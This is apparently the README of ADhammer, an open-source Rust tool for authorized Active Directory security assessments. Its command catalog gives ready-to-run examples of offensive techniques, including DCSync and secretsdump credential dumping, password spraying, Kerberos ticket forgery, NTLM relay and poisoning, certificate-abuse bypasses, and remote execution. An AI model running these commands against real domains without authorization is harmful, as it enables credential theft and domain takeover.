<p align="center">
  <img src="docs/readme-banner.svg" alt="ADhammer — discover, map, validate, report" width="100%" />
</p>

<h1 align="center">ADhammer</h1>

<p align="center">
  <strong>Evidence-first Active Directory assessment in Rust.</strong><br />
  Discover the domain. Map Tier-0 paths. Validate only what can be backed by proof.
</p>

<p align="center">
  <a href="https://icedracon.github.io/adhammer/"><strong>WEBSITE</strong></a>
  &nbsp;·&nbsp;
  <a href="#quick-start"><strong>QUICK START</strong></a>
  &nbsp;·&nbsp;
  <a href="#cli-methods-74"><strong>CLI METHODS</strong></a>
  &nbsp;·&nbsp;
  <a href="#10-starting-workflows"><strong>10 STARTING WORKFLOWS</strong></a>
  &nbsp;·&nbsp;
  <a href="docs/VALIDATION.md"><strong>VALIDATION LEDGER</strong></a>
  &nbsp;·&nbsp;
  <a href="CHANGELOG.md"><strong>RELEASE NOTES</strong></a>
</p>

<p align="center">
  <a href="https://github.com/icedracon/adhammer/actions/workflows/ci.yml"><img src="https://img.shields.io/github/actions/workflow/status/icedracon/adhammer/ci.yml?branch=main&style=flat-square&label=CI&color=2EA8FF&labelColor=03060C" alt="CI" /></a>
  <a href="https://github.com/icedracon/adhammer/releases"><img src="https://img.shields.io/github/v/release/icedracon/adhammer?sort=semver&style=flat-square&color=A78BFA&labelColor=03060C" alt="Latest release" /></a>
  <a href="https://crates.io/crates/adhammer"><img src="https://img.shields.io/crates/v/adhammer.svg?style=flat-square&color=55D6BE&labelColor=03060C" alt="crates.io" /></a>
  <a href="LICENSE"><img src="https://img.shields.io/badge/license-MIT-F7C948?style=flat-square&labelColor=03060C" alt="MIT License" /></a>
</p>

<br />

## From signal to evidence

ADhammer is an open-source CLI for authorized Active Directory security
assessments. It collects directory state, resolves control paths that end at
Tier-0, and reports every result with an explicit status — so a defender knows
what was **observed**, what was **validated with proof**, and what is
**validation owed**.

```
   Discover  ──▶  Map  ──▶  Validate  ──▶  Report
   directory      Tier-0    supported       JSON · HTML · MD
   state          paths     paths only      · BloodHound CE
```

| Signal | Meaning |
|:--|:--|
| **Observed** | A condition was collected from the assessment scope. |
| **Validated** | A supported path produced recorded proof. |
| **Validation owed** | Code or a possible path exists, but proof is not on file. |

The [validation ledger](docs/VALIDATION.md) is authoritative for support and
readiness claims.

<br />

## Quick start

```sh
cargo install --locked adhammer
adhammer --help
```

One binary. No Python runtime. No sidecar service. Prebuilt release binaries
are available for Linux, macOS, and Windows.

<details>
<summary><strong>Start an authorized assessment</strong></summary>
<br />

```sh
# Inspect the surface before any live command.
adhammer --help

# Passive audit workflow.
adhammer scan --help

# Preflight against a real target (no attack surface).
adhammer doctor --domain corp.local --dc dc.corp.local
```

Use only systems you own or are explicitly authorized to test. Read the
[security policy](SECURITY.md), [validation ledger](docs/VALIDATION.md), and
[release notes](CHANGELOG.md) before an engagement.

</details>

<br />

## What ships in v1.5.2

Modernizes the tool for **Windows Server 2025 / KB5014754** engagements and
tightens every operator-visible error path.

- **KB5014754 bypass** — `attack esc1 --sid` (auto-resolved from the target
  UPN over LDAP) emits the `szOID_NTDS_CA_SECURITY_EXT` extension into the
  issued cert, so PKINIT succeeds against Full-Enforcement KDCs.
- **Pass-the-hash DCSync** — `attack dcsync --nt-hash @file:...` binds
  DRSUAPI without a cleartext password.
- **Workstation preflight** — `doctor --client <host>` reports the SMB / WinRM
  / RDP surface a workstation-target chain actually needs.
- **Hard-audited error classifier** — every operator-visible hint now names
  the actual remedy (TCP-reset ≠ unreachable, AD CS policy denial ≠ TLS,
  8 KDC-numeric-error codes translated, plaintext-bind guard names
  `--gssapi` / `--allow-plaintext-ldap`, not `--insecure`).
- **Report polish** — HTML print stylesheet, `schema_version` on the JSON,
  build-provenance footer, typed JSON on `dcsync` / `secretsdump` / `samr`.

Full detail: [CHANGELOG.md](CHANGELOG.md).

| Surface | What it gives you |
|:--|:--|
| **Directory assessment** | LDAP collection, AD CS context, delegation, trust, hygiene, and posture analysis. |
| **Attack-path graph** | Directional control edges and the cheapest viable routes to Tier-0. |
| **Evidence outputs** | JSON, HTML, Markdown, and BloodHound CE export — findings, paths, and proof kept connected. |
| **First-touch discovery** | Scoped DNS, AD web-surface, and anonymous posture workflows. |
| **Rust ecosystem** | Published icedracon protocol crates that can be consumed independently. |

<br />

## Scope boundaries

<p align="center">
  <img src="https://img.shields.io/badge/AD%20PENTEST-NATIVE%20SCOPE-2EA8FF?style=flat-square&labelColor=03060C" alt="AD pentest: native scope" />
  <img src="https://img.shields.io/badge/SIEM-JSON%20HANDOFF-A78BFA?style=flat-square&labelColor=03060C" alt="SIEM: JSON handoff" />
  <img src="https://img.shields.io/badge/EDR%20%2F%20DLP-EXTERNAL%20CONTROLS-F7C948?style=flat-square&labelColor=03060C" alt="EDR and DLP: external controls" />
  <img src="https://img.shields.io/badge/WEB%20%2F%20APK-SEPARATE%20SCOPE-55D6BE?style=flat-square&labelColor=03060C" alt="Web and APK: separate scope" />
</p>

| Domain | ADhammer's role |
|:--|:--|
| **SIEM / case workflow** | Machine-readable JSON evidence for downstream CI, SIEM, and scoring pipelines — not a built-in vendor connector. |
| **EDR / DLP** | External controls. Authorized assessments create observable protocol activity; ADhammer ships no evasion or endpoint-agent capability. |
| **Sigma / YARA** | Not shipped. Detection content belongs in the team's approved detection-engineering workflow. |
| **Web / APK pentest** | Separate disciplines. ADhammer's web capability targets AD-facing surfaces only. |

<p align="center">
  <code>ADhammer assessment</code> &nbsp;→&nbsp; <code>evidence-rich JSON report</code> &nbsp;→&nbsp; <code>your approved detection / case workflow</code>
</p>

<br />

## Built for

- **Assessors** — scoped AD reconnaissance, analysis, and supported validation.
- **Defenders** — findings that distinguish observed conditions, recorded proof, and validation still owed.
- **Rust developers** — reusable protocol crates and an SDK for integration.

<br />

## The icedracon stack

ADhammer is the application layer on top of published, standalone Rust crates
for Microsoft security protocols. Use the binary for an assessment, or adopt a
single crate when you need a lower-level building block. Publication alone
does not establish production readiness — each crate has its own maturity and
validation status.

| Layer | Crates |
|:--|:--|
| **Transport** | [`dcerpc`](https://crates.io/crates/dcerpc) · [`smb2-client`](https://crates.io/crates/smb2-client) · [`ms-ndr`](https://crates.io/crates/ms-ndr) |
| **Directory / graph** | [`adhammer-collector`](https://crates.io/crates/adhammer-collector) · [`adhammer-graph`](https://crates.io/crates/adhammer-graph) · [`bloodhound-export`](https://crates.io/crates/bloodhound-export) |
| **Auth / crypto** | [`ntlmssp`](https://crates.io/crates/ntlmssp) · [`ms-pac-forge`](https://crates.io/crates/ms-pac-forge) · [`dpapi-ng`](https://crates.io/crates/dpapi-ng) |
| **AD CS / RPC** | [`ms-icpr`](https://crates.io/crates/ms-icpr) · [`ms-crtd`](https://crates.io/crates/ms-crtd) · [`ms-drsr`](https://crates.io/crates/ms-drsr) |

Wider ecosystem: [icedracon's repositories](https://github.com/icedracon?tab=repositories) · [SDK docs](https://docs.rs/adhammer-sdk).

<br />

## 10 starting workflows

Ten selected workflows for authorized discovery and configuration review—not
a usage ranking or a claim that these are the most popular commands. The full
74-method catalog follows below. Examples were checked against v1.5.2 source;
they are not new live-validation receipts.

Replace `example.test` hosts and account names only within your approved scope.
Use a trusted LDAPS certificate, protect `audit-password.txt`, and keep collected
output private. These commands make network connections; read-only does not
mean invisible or impact-free. Missing reads and empty findings are not an
all-clear. See the [validation ledger](docs/VALIDATION.md) for support limits.

<details>
<summary><strong>Open the ten examples and their interpretation</strong></summary>

### 1. Check DC reachability

```sh
adhammer doctor --domain example.test --dc dc.example.test --timeout 3 --json
```

DNS SRV discovery and TCP probes, without credentials. Read `checks`, `ran`,
`failed`, and `verdict`; a skipped bind does not establish authentication.

### 2. Check a workstation's reachable services · new in 1.5.2

```sh
adhammer doctor --client workstation.example.test --timeout 3 --json
```

Probes SMB, WinRM, and RDP ports. Reachability is not authenticated posture,
service security, or permission to execute anything on the host.

### 3. Read anonymous directory metadata

```sh
adhammer enum ldap-info --url ldaps://dc.example.test:636 --text
```

Reads RootDSE metadata exposed to an anonymous connection. It does not enumerate
all directory objects or prove a vulnerability. Anonymous access may be restricted.

### 4. Inventory AD-integrated DNS

```sh
adhammer enum dns --url ldaps://dc.example.test:636 --user auditor@example.test --password "@file:./audit-password.txt" --text
```

Reviews visible zones and records. Visibility is permission-dependent; a record
does not establish that its host is reachable.

### 5. Review certificate-template configuration

```sh
adhammer check adcs --url ldaps://dc.example.test:636 --user auditor@example.test --password "@file:./audit-password.txt" --json
```

Returns a JSON findings array from template rules. Review affected objects,
detail, and remediation. This does not issue certificates or perform a complete
ACL or CA-registry audit.

### 6. Read CA registry settings

```sh
adhammer enum esc --host ca.example.test --domain EXAMPLE --user auditor --password "@file:./audit-password.txt" --ca EXAMPLE-CA --text
```

Requires approved SMB/MS-RRP access and readable CA configuration. Correlate
findings with the host role; missing registry reads are not secure defaults.
Do not enable Remote Registry merely to run this example.

### 7. Discover CAs and inspect HTTP enrollment exposure

```sh
adhammer enum adcs --url ldaps://dc.example.test:636 --user auditor@example.test --password "@file:./audit-password.txt" --text
```

Authorization must cover both LDAP discovery **and HTTP/80 probes to discovered
CA hosts**. This is not passive enumeration or a complete HTTPS/EPA audit.
Exposure is not proof of a working relay path.

### 8. Review DC configuration posture

```sh
adhammer enum posture --host dc.example.test --domain EXAMPLE --user auditor --password "@file:./audit-password.txt" --text
```

Reads available LDAP-signing/channel-binding registry settings and probes named
pipes. Requires appropriate SMB/MS-RRP permissions; no coercion or relay is
executed by this example. Confirm missing values administratively.

### 9. Discover directory-published SCCM infrastructure

```sh
adhammer enum sccm --url ldaps://dc.example.test:636 --user auditor@example.test --password "@file:./audit-password.txt" --text
```

Reviews the SCCM/MECM footprint visible in LDAP. Published objects are inventory
leads, not proof of current service availability or exploitable configuration.

### 10. Discover directory-published SCOM infrastructure

```sh
adhammer enum scom --url ldaps://dc.example.test:636 --user auditor@example.test --password "@file:./audit-password.txt" --text
```

Reviews directory-published management infrastructure. Incomplete permissions
or stale objects can affect the result; validate the inventory with its owners.

</details>

## CLI methods (74)

The existing 74-method catalog is retained below. Its lab values are examples,
not approved targets; `.local` names can resolve in real environments. Do not
paste these commands unchanged. Review scope, impact, and the validation ledger
first; `--insecure` disables certificate verification and is not a production
default. Full help on any verb:
`adhammer <group> <verb> --help`.

### Top-level (7) + setup (1)

| Verb | What it does | Example |
|:--|:--|:--|
| `scan` | LDAP collection → control-path graph → checks → scored report | `adhammer scan --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure --out report.json` |
| `auto` | Guided: scan → validate + PoC → multi-format bundle | `adhammer auto --url ldaps://dc.corp.local:636 --user Administrator --password env:ADHAMMER_PASSWORD --insecure` |
| `run` | No-cred black-box: DNS SRV → DC/KDC/GC discovery | `adhammer run --domain corp.local --host 192.0.2.10` |
| `doctor` | Preflight (SRV / TCP / classified bind) with a named fix per failure | `adhammer doctor --domain corp.local --dc dc.corp.local --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure` |
| `gaps` | List every deferred item + its external-tool fallback | `adhammer gaps` |
| `completions` | Generate shell completions to stdout | `adhammer completions bash \| sudo tee /etc/bash_completion.d/adhammer` |
| `man` | Render man page (roff) to stdout | `adhammer man \| sudo tee /usr/share/man/man1/adhammer.1` |
| `setup krb5` | Write a working krb5.conf | `adhammer setup krb5 --realm CORP.LOCAL --dc dc.corp.local --out ~/.krb5.conf` |

### enum (22) — read-only enumeration

| Verb | What it does | Example |
|:--|:--|:--|
| `enum samr` | SAM user enumeration over MS-SAMR | `adhammer enum samr --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw` |
| `enum lsa` | LSA secret query (LsarRetrievePrivateData) | `adhammer enum lsa --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw --name DPAPI_SYSTEM` |
| `enum net` | Network sweep of AD-relevant ports | `adhammer enum net --targets 192.0.2.0/24` |
| `enum dns` | LDAP-integrated DNS zones dump | `adhammer enum dns --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure` |
| `enum adcs` | AD CS templates + CAs inventory | `adhammer enum adcs --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure` |
| `enum esc` | ESC1–ESC16 template abuse classifier | `adhammer enum esc --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw --ca CORP-CA` |
| `enum posture` | DC posture: SMB signing / channel binding / LDAP integrity | `adhammer enum posture --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw` |
| `enum sessions` | Logon sessions over NetSessionEnum | `adhammer enum sessions --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw` |
| `enum wkssvc` | WKSSVC transports + WKS info | `adhammer enum wkssvc --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw` |
| `enum hku` | HKEY_USERS SID inventory via WINREG | `adhammer enum hku --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw` |
| `enum sccm` | SCCM/MECM management-point inventory | `adhammer enum sccm --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure` |
| `enum scom` | SCOM management-server inventory | `adhammer enum scom --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure` |
| `enum krb-users` | Kerberos user enum (no LDAP creds) | `adhammer enum krb-users --realm CORP.LOCAL --kdc dc.corp.local --userlist users.txt` |
| `enum web` | AD-adjacent HTTP surface fingerprint | `adhammer enum web --host dc.corp.local --fast` |
| `enum nullbind` | Anonymous SMB null-session probe | `adhammer enum nullbind --host dc.corp.local` |
| `enum rpc-null` | Null-session RPC endpoint enumeration | `adhammer enum rpc-null --host dc.corp.local` |
| `enum shares` | Anonymous share enumeration | `adhammer enum shares --host dc.corp.local --anon` |
| `enum host` | Anonymous host fingerprint | `adhammer enum host --host dc.corp.local --anon` |
| `enum sysvol` | SYSVOL GPP cpassword walker | `adhammer enum sysvol --host dc.corp.local --anon` |
| `enum ldap-info` | Anonymous RootDSE fingerprint | `adhammer enum ldap-info --url ldap://dc.corp.local` |
| `enum ldap-users` | Anonymous LDAP user listing | `adhammer enum ldap-users --url ldap://dc.corp.local --anon` |
| `enum anon-services` | rsync / FTP / TFTP anonymous probes | `adhammer enum anon-services --host 192.0.2.10` |

### attack (34) — active, grouped by intent

<details open>
<summary><strong>Kerberos & credentials (10)</strong> — roast, spray, TGT, DCSync, dumps, hash unmasks</summary>

| Verb | What it does | Example |
|:--|:--|:--|
| `attack roast` | AS-REP roast + Kerberoast (hashcat output) | `adhammer attack roast --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure --kdc dc.corp.local` |
| `attack spray` | Kerberos password spray + user enum | `adhammer attack spray --kdc dc.corp.local --realm CORP.LOCAL --userlist users.txt --password 'Winter2026!'` |
| `attack asktgt` | Ask-TGT → reusable ccache | `adhammer attack asktgt --user Administrator --realm CORP.LOCAL --kdc dc.corp.local --password @file:./pw --out admin.ccache` |
| `attack dcsync` | DRSUAPI replication → creds (password OR **`--nt-hash`** — 1.5.2) | `adhammer attack dcsync --host dc.corp.local --domain corp.local --user Administrator --nt-hash @file:./admin.nt --target krbtgt` |
| `attack secretsdump` | Full SAM/LSA/NTDS dump | `adhammer attack secretsdump --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw` |
| `attack gmsa` | gMSA managed-password extraction | `adhammer attack gmsa --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure --target gmsa_svc` |
| `attack laps` | LAPS password read | `adhammer attack laps --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure` |
| `attack unpac` | PKINIT → PAC_CREDENTIAL_INFO → NT hash | `adhammer attack unpac --kdc dc.corp.local --realm CORP.LOCAL --user Administrator --key esc1.pfx.key.pem --cert esc1.pfx` |
| `attack dpapi-master-key` | Offline DPAPI masterkey decrypt | `adhammer attack dpapi-master-key --file ./mk.dat --sid S-1-5-21-1-2-3-500 --password @file:./userpw` |

</details>

<details>
<summary><strong>Delegation & S4U (4)</strong></summary>

| Verb | What it does | Example |
|:--|:--|:--|
| `attack rbcd` | S4U2Self + S4U2Proxy via RBCD | `adhammer attack rbcd --kdc dc.corp.local --realm CORP.LOCAL --account 'attacker$' --account-password @file:./attacker.pw --impersonate Administrator --target-spn cifs/target.corp.local` |
| `attack constrained` | S4U chain via `msDS-AllowedToDelegateTo` | `adhammer attack constrained --kdc dc.corp.local --realm CORP.LOCAL --account svc_deleg --account-password @file:./svc.pw --impersonate Administrator --target-spn cifs/target.corp.local` |
| `attack unconstrained` | Unconstrained delegation abuse | `adhammer attack unconstrained --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure` |
| `attack shadowcred` | Shadow Credentials via `msDS-KeyCredentialLink` | `adhammer attack shadowcred --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure --target 'DC01$' --pkinit --kdc dc.corp.local --realm CORP.LOCAL` |

</details>

<details>
<summary><strong>Ticket forgery (4)</strong></summary>

| Verb | What it does | Example |
|:--|:--|:--|
| `attack golden` | Forge golden TGT + optional KDC-accept verify | `adhammer attack golden --kdc dc.corp.local --realm CORP.LOCAL --krbtgt-aes256 @file:./krbtgt.key --domain-sid S-1-5-21-1-2-3 --user Administrator --rid 500 --out golden.ccache --verify-spn ldap/dc.corp.local` |
| `attack silver` | Forge silver ticket (per-SPN) | `adhammer attack silver --realm CORP.LOCAL --service-aes256 @file:./svc.key --spn cifs/target.corp.local --domain-sid S-1-5-21-1-2-3 --user Administrator --rid 500 --out silver.ccache` |
| `attack diamond` | Diamond ticket (forged PAC in real TGT) | `adhammer attack diamond --kdc dc.corp.local --realm CORP.LOCAL --template-user Administrator --template-password @file:./pw --krbtgt-aes256 @file:./krbtgt.key --domain-sid S-1-5-21-1-2-3 --out diamond.ccache` |
| `attack ptt` | Pass-the-ticket (golden → TGS → AP-REQ → exec) | `adhammer attack ptt --host target.corp.local --spn cifs/target.corp.local --kdc dc.corp.local --realm CORP.LOCAL --domain-sid S-1-5-21-1-2-3 --krbtgt-aes256 @file:./krbtgt.key --user Administrator --rid 500 --command whoami` |

</details>

<details>
<summary><strong>AD CS (3)</strong></summary>

| Verb | What it does | Example |
|:--|:--|:--|
| `attack esc1` | AD CS ESC1 chain + optional PKINIT (**auto-`--sid`** on 1.5.2) | `adhammer attack esc1 --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw --ca CORP-CA --template VulnUser --upn 'Administrator@corp.local' --pkinit --kdc dc.corp.local` |
| `attack icpr-esc1` | Direct ICPR path (ESC1/3/6/15) with **`--sid`** support | `adhammer attack icpr-esc1 --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw --ca CORP-CA --template VulnUser --target-upn 'Administrator@corp.local' --sid S-1-5-21-1-2-3-500 --out esc1.pfx` |
| `attack esc4` | ESC4 template-DACL modify → ESC1 chain | `adhammer attack esc4 --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure --template VulnTemplate --commit` |

</details>

<details>
<summary><strong>Coercion & relay (4)</strong></summary>

| Verb | What it does | Example |
|:--|:--|:--|
| `attack coerce` | Coerce DC auth (PetitPotam / EFSR / DFSCoerce / PrinterBug) | `adhammer attack coerce --host dc.corp.local --domain corp.local --user Administrator --password @file:./pw --listener 192.0.2.100` |
| `attack capture` | SMB NetNTLMv2 capture listener (needs root) | `sudo adhammer attack capture --listen 0.0.0.0:445` |
| `attack poison` | LLMNR / NBT-NS poisoner (needs root) | `sudo adhammer attack poison --spoof-ip 192.0.2.100` |
| `attack relay` | NTLM relay to LDAPS / SMB targets | `sudo adhammer attack relay --target-dc dc.corp.local --realm CORP.LOCAL --target-object CN=Administrator` |

</details>

<details>
<summary><strong>Remote exec (4)</strong></summary>

| Verb | What it does | Example |
|:--|:--|:--|
| `attack exec` | SVCCTL remote exec | `adhammer attack exec --host target.corp.local --domain corp.local --user Administrator --password @file:./pw --command whoami` |
| `attack atexec` | AT/TSCH remote exec | `adhammer attack atexec --host target.corp.local --domain corp.local --user Administrator --password @file:./pw --command whoami` |
| `attack wmiexec` | WMI remote exec | `adhammer attack wmiexec --host target.corp.local --domain corp.local --user Administrator --password @file:./pw --command whoami --fast` |
| `attack winrm` | WinRM remote exec (`--shell {cmd,powershell}`) | `adhammer attack winrm --host target.corp.local --domain corp.local --user Administrator --password @file:./pw --command whoami --shell powershell` |

</details>

<details>
<summary><strong>LDAP write / Server 2025 (3)</strong></summary>

| Verb | What it does | Example |
|:--|:--|:--|
| `attack abuse` | LDAP abuse: add-spn / add-member / set-password / write-rbcd / … | `adhammer attack abuse --action add-spn --target victim --value FAKE/x.corp.local --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure --commit` |
| `attack dns` | ADIDNS record add / modify / tombstone / delete | `adhammer attack dns --action add-a --name webhook --ip 192.0.2.55 --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure` |
| `attack badsuccessor` | Server 2025 dMSA takeover | `adhammer attack badsuccessor --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure --dmsa-name 'takeover$' --target targetuser --commit` |

</details>

<details>
<summary><strong>Detection-only + misc (3)</strong></summary>

| Verb | What it does | Example |
|:--|:--|:--|
| `attack zerologon` | SAFE Zerologon detection (CVE-2020-1472) — never resets | `adhammer attack zerologon --host dc.corp.local --netbios DC01` |
| `attack dcshadow` | DCShadow replication injection | `adhammer attack dcshadow --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure` |
| `attack mssql` | MSSQL query (feature-gated) | `adhammer attack mssql --host target.corp.local --domain corp.local --user Administrator --password @file:./pw --query 'SELECT @@version'` |

</details>

### kerb (4) · creds (2) · check (2) · ldap (1) · lsa (1)

| Verb | What it does | Example |
|:--|:--|:--|
| `kerb pkinit` | Pass-the-cert → TGT ccache | `adhammer kerb pkinit --user Administrator --realm CORP.LOCAL --kdc dc.corp.local --key admin.key.pem --cert admin.crt --out admin.ccache` |
| `kerb u2u-nt` | U2U + PAC → NT hash | `adhammer kerb u2u-nt --kdc dc.corp.local --realm CORP.LOCAL --user Administrator --key admin.key.pem --cert admin.crt` |
| `kerb trust-mint` | Mint cross-realm TGT from a trust key | `adhammer kerb trust-mint --user 'PARTNER$' --realm CORP.LOCAL --kdc dc.corp.local --password @file:./trust.key --out cross.ccache` |
| `kerb trust-dump` | Enumerate cross-forest trusts | `adhammer kerb trust-dump --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure` |
| `creds gpp-decrypt` | MS14-025 cpassword → plaintext | `adhammer creds gpp-decrypt 'edBSHOwhZLTjt/QS9FeIcJ83mjWA98gw9guKOhJOdcqh...'` |
| `creds kdbx-extract` | KDBX4 decrypt with known master password | `adhammer creds kdbx-extract --file vault.kdbx --password @file:./master.pw` |
| `check adcs` | ESC1–16 template & CA posture | `adhammer check adcs --url ldaps://dc.corp.local:636 --user Administrator --password @file:./pw --insecure` |
| `check wdigest` | UseLogonCredential registry check | `adhammer check wdigest --host target.corp.local --domain corp.local --user Administrator --password @file:./pw` |
| `ldap auth` | Cert-based LDAPS bind (SASL EXTERNAL) | `adhammer ldap auth --host dc.corp.local --port 636 --pfx admin.pfx --pfx-password @file:./pfxpw` |
| `lsa lsass-parse` | Offline minidump reader | `adhammer lsa lsass-parse ./lsass.dmp` |

### Global flags (compose with any verb)

| Flag | Effect |
|:--|:--|
| `--fast` (or `ADHAMMER_FAST=1`) | Strip deliberate pacing (WMI backoff, network-sweep timeouts). Safety controls unaffected. |
| `-q` / `--quiet` | Suppress decorative stderr chrome; data on stdout untouched. |
| `--no-color` | Drop ANSI color (equivalent to `NO_COLOR=1`). |
| `--json` / `--text` | Force JSON envelope / human output for attack/enum/dump. |
| `-v` / `-vv` / `-vvv` | Verbosity: info → debug → trace. |
| `--socks <host:port>` | Route ALL outbound TCP through a SOCKS5 pivot. |

### Secret conventions (every credential flag)

| Form | Example |
|:--|:--|
| File | `--password @file:/path/to/pw` |
| Env var | `--password env:ADHAMMER_PASSWORD` |
| Secure prompt | `--password ''` with the env var unset |

Literal secrets on argv are **rejected** by the SecretString guard to prevent
shell-history leakage. Same convention applies to `--nt-hash`,
`--krbtgt-aes256`, `--service-aes256`, `--pfx-password`.

<br />

## Reference shelf

| Need | Go here |
|:--|:--|
| Release-specific change log | [CHANGELOG.md](CHANGELOG.md) |
| Support and validation state | [docs/VALIDATION.md](docs/VALIDATION.md) |
| Security policy and reporting | [SECURITY.md](SECURITY.md) |
| Contributing guidance | [CONTRIBUTING.md](CONTRIBUTING.md) |

<br />

## Authorized use

> [!CAUTION]
> ADhammer implements security-assessment and validation capabilities that can
> affect production systems. Use it only against systems you own or are
> explicitly authorized to test.

<p align="center">
  <sub>MIT © <a href="https://github.com/icedracon">icedracon</a></sub>
</p>
